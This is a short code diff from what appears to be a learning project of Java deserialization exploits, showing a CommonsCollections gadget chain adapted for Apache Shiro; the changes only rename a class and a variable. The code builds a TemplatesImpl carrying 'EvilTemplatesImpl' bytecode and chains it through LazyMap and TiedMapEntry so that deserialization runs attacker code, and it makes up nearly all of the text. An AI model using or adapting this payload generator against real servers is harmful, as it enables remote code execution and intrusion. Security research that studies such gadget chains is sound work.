@@ -41,7 +41,7 @@ import static com.xjjlearning.hack.java.ysoserial.payloads.util.ReflectionUtil.s
 public class CommonCollectionsShiro {
     // 由于在复现shiro的时候发现传入数组不行(InvokerTransformer[]) 于是修改payload
     public byte[] getPayload(String exp) throws Exception {
-        class A extends TransformerFactoryImpl {
+        class TFactory extends TransformerFactoryImpl {
         }
 
         byte[] code = ClassUtil.classAsBytes(EvilTemplatesImpl.class);
@@ -49,19 +49,19 @@ public class CommonCollectionsShiro {
         TemplatesImpl templates = new TemplatesImpl();
         setFieldValue(templates, "_name", "");
         setFieldValue(templates, "_bytecodes", new byte[][]{code});
-        setFieldValue(templates, "_tfactory", new A());
+        setFieldValue(templates, "_tfactory", new TFactory());
 
         Transformer transformer = new InvokerTransformer("getClass", null, null);
 
-        Map outerMap = LazyMap.decorate(new HashMap(), transformer);
+        Map innerMap = LazyMap.decorate(new HashMap(), transformer);
 
         HashMap obj = new HashMap();
 
         /**
          * TiedMapEntry(map, key) -> TiedMapEntry.getValue() -> map.get()
          */
-        obj.put(new TiedMapEntry(outerMap, templates), "");
-        outerMap.clear();
+        obj.put(new TiedMapEntry(innerMap, templates), "");
+        innerMap.clear();
 
         setFieldValue(transformer, "iMethodName", "newTransformer");
 
